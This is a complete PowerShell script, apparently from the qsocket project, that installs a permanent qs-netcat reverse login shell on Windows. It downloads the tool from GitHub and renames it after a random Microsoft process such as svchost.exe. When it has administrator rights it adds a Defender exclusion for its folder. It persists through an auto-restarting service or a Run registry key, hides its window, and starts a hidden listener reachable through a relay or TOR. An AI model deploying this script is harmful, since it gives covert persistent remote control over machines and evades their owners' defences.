# Install and start a permanent qs-netcat reverse login shell
#
# See https://qsocket.io/ for examples.
# 
# $Env:S="MySecret" # for deploying with a spesific secret.
# $Env:DEBUG=1      # for verbose output.

$ERR_LOGS=$null # New-TemporaryFile
$GITHUB_REPO="https://api.github.com/repos/qsocket"
$QS_UTIL="qsocket"
$QS_BIN_NAME="qsock.exe"
$QS_BIN_HIDDEN_NAME="svchost.exe"
$QS_SCHEDULED_TASK_NAME="MS-Update"
$BANNER=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gIElOID4gICAgICAgICAgICAgICAgICAgICAgICAgICItXyAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvICAgICAgLiAgfCAgLiAgICDjg73gvLzguojZhM2c4LqI4Ly9KSk+PS0gICAgICAgXCAgICAgICAgICAKICAg4Ly844Gk4LKg55uK4LKg4Ly944GkIOKUgD3iiaHOo08pKSAgIF8gICAgICAgIF8gICAgICAgLyAgICAgIDogXCB8IC8gOiAgICAgICAgICAgICAgICAgICAgICAgXCAgICAgICAgIAogICBfXyBfIF9fXyAgX19fICAgX19ffCB8IF9fX19ffCB8XyAgICAvICAgICAgICAnLV9fXy0nICAgICAgICAgIOKYnCjinY3htKXinY3KiykpPi0gICAgXCAgICAgIAogIC8gX2AgLyBfX3wvIF8gXCAvIF9ffCB8LyAvIF8gXCBfX3wgIC9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyBcICAgICAgCiB8IChffCBcX18gXCAoXykgfCAoX198ICAgPCAgX18vIHxfICAgICAgICBfX19fX19ffCB8X19fX19fX19fX19fX19fX19fX19fX19fLS0iIi1MIAogIFxfXywgfF9fXy9cX19fLyBcX19ffF98XF9cX19ffFxfX3wgICAgICAvICAgICAgIEYgSiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwgCiAgICAgfF98ICAgQ29weXJpZ2h0IChjKSAyMDIzIFFzb2NrZXQgICAgLyAgICAgICBGICAgSiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTAogIGh0dHBzOi8vZ2l0aHViLmNvbS9xc29ja2V0LyAgICAgICAgICAgLyAgICAgIDonICAgICAnOiAgIOKUgD3iiaHOoygoKCDjgaTil5XZhM2c4peVKeOBpCAgICAgICAgIEYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyAgT1VUIDwgJy1fX18tJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAvIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXy0tIgoK")) | Out-String

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

function Print-Warning($str)
{
    Write-Host "[!] " -ForegroundColor Yellow -NoNewline; 
    Write-Host "$str" 
}

function Print-Status($str)
{
    Write-Host "[*] " -ForegroundColor Yellow -NoNewline; 
    Write-Host "$str" 
}

function Print-Success($str)
{
    Write-Host "[+] " -ForegroundColor Green -NoNewline; 
    Write-Host "$str" 
}

function Print-Error($str)
{
    Write-Host "[-] " -ForegroundColor Red -NoNewline; 
    Write-Host "$str" 
}

function Print-Fatal($str)
{
    Write-Host "[!] " -ForegroundColor Red -NoNewline; 
    Write-Host "$str" 
    exit 1
}

function Print-Progress($str)
{
    if (-Not $env:DEBUG) { 
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline;
        Write-Host "$str" -NoNewline;
        Write-Host ("."*(60-$str.Length)) -NoNewline;
    }  
}

function Print-Ok()
{
    if (-Not $env:DEBUG) { 
        Write-Host "[" -NoNewline;
        Write-Host "OK" -ForegroundColor Green -NoNewline;
        Write-Host "]";
    }  
}

function Print-Fail()
{
    if (-Not $env:DEBUG) { 
        Write-Host "[" -NoNewline;
        Write-Host "FAIL" -ForegroundColor Red -NoNewline;
        Write-Host "]";
    }  
}

function Print-Debug($str)
{
    if ($env:DEBUG) { 
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline; 
        Write-Host "$str" 
    }  
}

function Hide-Console
{
  $consolePtr = [Console.Window]::GetConsoleWindow()
  #0 hide
  [Console.Window]::ShowWindow($consolePtr, 0)
}

function Get-RandomProcessName {
  # Get the list of all running processes
  $processes = Get-Process
    
  # Filter the processes to only include those with 'Microsoft' in their company name
  $microsoftProcesses = $processes | Where-Object { $_.Company -like "*Microsoft*" }
    
  # Check if there are any Microsoft processes running
  if ($microsoftProcesses.Count -eq 0) {
    return "svchost.exe"
  }
  # Select a random process from the list of Microsoft processes
  $randomProcess = $microsoftProcesses | Get-Random
    
  # Return the name of the random Microsoft process
  return $randomProcess.Name + ".exe"
}

function Is-Administrator  
{  
    return [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
}

function Get-Latest-Release  
{

    $QS_PACKAGE="windows_386.tar.gz"
    Switch ($Env:PROCESSOR_ARCHITECTURE)
    {
        "x86" {$QS_PACKAGE="windows_386.tar.gz"}
        "AMD64" {$QS_PACKAGE="windows_amd64.tar.gz"}
        "ARM64" {$QS_PACKAGE="windows_arm64.tar.gz"}
        "ARM" {$QS_PACKAGE="windows_arm.tar.gz"}
        default {Print-Fatal "Unsupported Windows architecture!"}
    }
    Print-Debug "Package: $QS_PACKAGE"

    try {
        $r = Invoke-WebRequest "$GITHUB_REPO/$QS_UTIL/releases/latest" -UseBasicParsing
        $lines = $r.Content.Split('"')
        $uri=(echo $lines | Select-String '/releases/download/' | Select-String "$QS_PACKAGE")
    }catch {
        Print-Debug $_.Exception
        throw $_.Exception
    }
    return $uri.Line.split()
}

function Download-Qsocket-Util($path)
{
    try {
        $downloadUrl = Get-Latest-Release
        Print-Debug "Latest Release: $downloadUrl"
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add("Accept","application/octet-stream")
        $WebClient.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
        $WebClient.DownloadFile($downloadUrl, $path)
        if(Test-Path -Path "$path" -PathType Leaf){
            Print-Debug "Qsocket binary downloaded under: $path"
        }
    }catch{
        Print-Debug $_.Exception
        throw $_.Exception
    }
}

function Set-PeSubsystemGUI {
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [string]$Path
    )

    $resolvedPath = (Resolve-Path -LiteralPath $Path -ErrorAction Stop).Path
    $bytes = [System.IO.File]::ReadAllBytes($resolvedPath)

    # Validate DOS header
    if ($bytes.Length -lt 64 -or
        $bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) {
        throw "Invalid DOS/PE executable."
    }

    # Locate PE header
    $peOffset = [BitConverter]::ToInt32($bytes, 0x3C)

    if ($peOffset -lt 64 -or $peOffset -gt ($bytes.Length - 24)) {
        throw "Invalid PE header offset."
    }

    # Validate PE signature
    if ([BitConverter]::ToUInt32($bytes, $peOffset) -ne 0x00004550) {
        throw "Invalid PE signature."
    }

    # Locate Optional Header
    $optionalHeaderOffset = $peOffset + 24

    $optionalHeaderSize = [BitConverter]::ToUInt16(
        $bytes, $peOffset + 20
    )

    if ($optionalHeaderSize -lt 70 -or
        $optionalHeaderOffset + $optionalHeaderSize -gt $bytes.Length) {
        throw "Invalid Optional Header."
    }

    # Validate PE32 or PE32+ magic
    $magic = [BitConverter]::ToUInt16($bytes, $optionalHeaderOffset)

    if ($magic -ne 0x10B -and $magic -ne 0x20B) {
        throw "Unsupported PE Optional Header format."
    }

    # Subsystem field offset: Optional Header + 68
    $subsystemOffset = $optionalHeaderOffset + 68

    $currentSubsystem = [BitConverter]::ToUInt16(
        $bytes, $subsystemOffset
    )

    if ($currentSubsystem -eq 2) {
        Print-Debug "Executable already uses Windows GUI subsystem."
        return
    }

    # Set subsystem to Windows GUI (2)
    $bytes[$subsystemOffset] = 0x02
    $bytes[$subsystemOffset + 1] = 0x00

    # Save modified executable
    [System.IO.File]::WriteAllBytes($resolvedPath, $bytes)

    Print-Debug "Subsystem changed from $currentSubsystem to Windows GUI (2)."
}

function Create-Sceduled-Task($path, $secret)
{
    Print-Debug "Creating scheduled task..."
    Print-Debug "Task command: powershell.exe -WindowStyle Hidden -Command $path -liqs $secret"
    try {
        $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$path -liqs $secret`""
        $T = New-ScheduledTaskTrigger -AtStartup
        if(Is-Administrator){
            $P = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
        }else{
            $P = New-ScheduledTaskPrincipal "$env:USERNAME"
        }
        $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P
        $S = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
        Register-ScheduledTask "${QS_SCHEDULED_TASK_NAME}_${RAND_NAME}" -InputObject $D | out-null
    }catch {
        Print-Debug $_.Exception
        throw $_.Exception
    }
}

function Create-Run-Key($path, $secret)
{
    Print-Debug "Adding CurrentVersion\Run registery..."
    $RUN_CMD="powershell.exe -WindowStyle Hidden -Command \`"$path -lq $secret\`""
    Print-Debug $RUN_CMD 
    try {
        if(Is-Administrator){
            Print-Debug "Running as administrator"
            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /f /d "$RUN_CMD" >$ERR_LOGS
        }else{
            Print-Debug "Running as $env:UserName"
            reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /f /d "$RUN_CMD" >$ERR_LOGS
        }
    }catch {
        Print-Debug $_.Exception
        throw $_.Exception
    }
    Print-Debug "Auto-run key added successfully"  
}

function Install-WindowsService {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ExePath,
        [Parameter(Mandatory)]
        [string]$ServiceName,
        [string]$DisplayName = $ServiceName,
        [string]$Description = "Windows service installed by PowerShell",
        [string]$Arguments
    )

    # Require Administrator
    $principal = [Security.Principal.WindowsPrincipal]::new(
        [Security.Principal.WindowsIdentity]::GetCurrent()
    )

    if (-not $principal.IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator
    )) {
        throw "This function must be run as Administrator."
    }

    # Validate EXE
    $ExePath = [System.IO.Path]::GetFullPath($ExePath)

    if (-not (Test-Path -LiteralPath $ExePath -PathType Leaf)) {
        throw "EXE file not found: $ExePath"
    }

    # Check whether service already exists
    if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
        throw "Service '$ServiceName' already exists."
    }

    # Build service command line
    $BinaryPathName = $ExePath

    if (-not [string]::IsNullOrWhiteSpace($Arguments)) {
        $BinaryPathName += " $Arguments"
    }

    Print-Debug "Binary Path Name: $BinaryPathName"
    # Create service
    New-Service `
        -Name $ServiceName `
        -BinaryPathName $BinaryPathName `
        -DisplayName $DisplayName `
        -Description $Description `
        -StartupType Automatic | Out-Null
    
    # # Set service-specific environment variable
    # $ServiceRegistryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
    #
    # New-ItemProperty `
    #   -Path $ServiceRegistryPath `
    #   -Name Environment `
    #   -PropertyType MultiString `
    #   -Value "QS_ARGS='$Arguments'" `
    #   -Force | Out-Null


    # Configure automatic restart on failure
    sc.exe failure $ServiceName `
        reset= 86400 `
        actions= restart/5000/restart/5000/restart/5000 | Out-Null

    if ($LASTEXITCODE -ne 0) {
        throw "Failed to configure service failure actions."
    }

    # Configure delayed automatic startup
    sc.exe config $ServiceName start= delayed-auto | Out-Null

    if ($LASTEXITCODE -ne 0) {
        throw "Failed to configure delayed automatic startup."
    }

    # Start service
    Start-Service -Name $ServiceName | Out-Null

    # Write-Host "Service installed successfully:"
    # Write-Host "  Name       : $ServiceName"
    # Write-Host "  Executable : $ExePath"
    #
    # if (-not [string]::IsNullOrWhiteSpace($Arguments)) {
    #     Write-Host "  Arguments  : $Arguments"
    # }
    #
    # Write-Host "  Startup    : Automatic (Delayed)"
    # Write-Host "  Recovery   : Restart after 5 seconds"
}


function Print-Usage($secret_file)
{
    Write-Host " `n"
    Get-Content $secret_file # | & $QS_PATH "--qr"
    Write-Host " `n"
    Write-Host "# >>> Connect ============> qsock.exe ssh $SECRET" -ForegroundColor Green
    Write-Host "# >>> Connect With TOR ===> qsock.exe -T ssh $SECRET" -ForegroundColor Green
    Write-Host " `n"
}

if ($env:HIDE) {
  Hide-Console
}

## =========================== START HERE ======================== 
Write-Host "$BANNER"
if ($env:DEBUG) {
  $ERR_LOGS=New-TemporaryFile
  Print-Debug "Error Logs: $ERR_LOGS"
}
$SECRET=$Env:S
$QS_BIN_HIDDEN_NAME = Get-RandomProcessName
$RAND_NAME= -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
$SECRET_FILE= Join-Path -Path "$env:TMP" -ChildPath "$RAND_NAME.txt"
$QS_DIR= Join-Path -Path "$env:APPDATA" -ChildPath "$RAND_NAME" 
$QS_PATH= Join-Path -Path $QS_DIR -ChildPath "$QS_BIN_HIDDEN_NAME"
$PERSISTENCE=$false
Print-Status "QSocket Dir: $QS_PATH"
mkdir $QS_DIR >$ERR_LOGS

if (Is-Administrator) {
    Print-Progress "Adding defender exclusion path"
    try {
        Add-MpPreference -ExclusionPath "$QS_DIR" 2>$ERR_LOGS
        Print-Ok
    }catch {
        Print-Fail
    }
}

# Download the latest qsocket utility
try {
    Print-Progress "Downloading binaries"
    Download-Qsocket-Util(Join-Path -Path $QS_DIR -ChildPath "$RAND_NAME.tar.gz")
    Print-Ok  
}catch {
    Print-Fail
    Print-Fatal "Failed downloading QSocket util."
}

# Extract TAR.GZ to QS_PATH
try {
    Print-Progress "Unpacking binaries"
    tar zx -C "$QS_DIR" -f (Join-Path -Path $QS_DIR -ChildPath "$RAND_NAME.tar.gz") 2>$ERR_LOGS
    Print-Ok
}catch{
    Print-Fail
    Print-Fatal "Failed extracting Qsocket util."
}

try {
    Print-Progress "Copying binaries"
    Remove-Item -Path (Join-Path -Path $QS_DIR -ChildPath "$RAND_NAME.tar.gz")
    Rename-Item -Path (Join-Path -Path $QS_DIR -ChildPath "$QS_BIN_NAME") -NewName "$QS_BIN_HIDDEN_NAME"
    if(! (Test-Path -Path $QS_PATH -PathType Leaf)){
        Print-Fail
        Print-Fatal "Move failed. ->  $QS_PATH"
    }
    Print-Ok
}catch {
    Print-Fail
    Print-Fatal "Unable to copy qsocket binaries."
}


try {
    Print-Progress "Testing qsocket binaries"
    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName = $QS_PATH
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute = $false
    $pinfo.Arguments = "-g"
    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo = $pinfo
    $proc.Start() | Out-Null
    $proc.WaitForExit()
    $RAND_SECRET = $proc.StandardOutput.ReadToEnd().Trim()
    $RAND_SECRET | & $QS_PATH --qr | Out-File -FilePath "$SECRET_FILE"
    Print-Debug "Random Secret: $RAND_SECRET"
    Print-Ok
}catch{
    Print-Fail
    Print-Fatal "Binary test failed! Exiting..."
}

if ($SECRET.Length -eq 0) {
  if ($RAND_SECRET.Length -eq 0) {
    Print-Fatal "QSocket binary not working properly! Exiting..."
  }
  $SECRET=$RAND_SECRET
}

if (Is-Administrator) {
  try {
    Print-Progress "Installing system wide permanent access via SCM service"
    # Create-Sceduled-Task $QS_PATH ssh $SECRET
    Install-WindowsService -ExePath $QS_PATH -ServiceName "QsDaemon" -Arguments "-lq $SECRET"
    Print-Ok
    $PERSISTENCE=$true
  }catch{
    Print-Debug "Exception occurred:"
    Print-Debug $_.Exception.Message
    Print-Fail
  }
}

if ($PERSISTENCE -eq $false) {
    try {
      Print-Progress "Setting EXE subsystem as GUI"
      Set-PeSubsystemGUI $QS_PATH
      Print-Ok
    }catch {
      Print-Fail
    }

    try {
        Print-Progress "Installing system wide permanent access via registery"
        Create-Run-Key $QS_PATH $SECRET
        Print-Ok
        $PERSISTENCE=$true
    }catch{
        Print-Fail
    }

    try {
        Print-Progress "Starting qsocket utility"
        Start-Process $QS_PATH "-lq $SECRET" -WindowStyle Hidden
        Print-Debug "Path: $QS_PATH -lq $SECRET"
        Print-Ok
    }catch{
        Print-Fail
    }
}

if ($PERSISTENCE -eq $false) {
  Print-Warning "Permanent install methods failed! Access will be lost after reboot."
}

Print-Usage($SECRET_FILE)
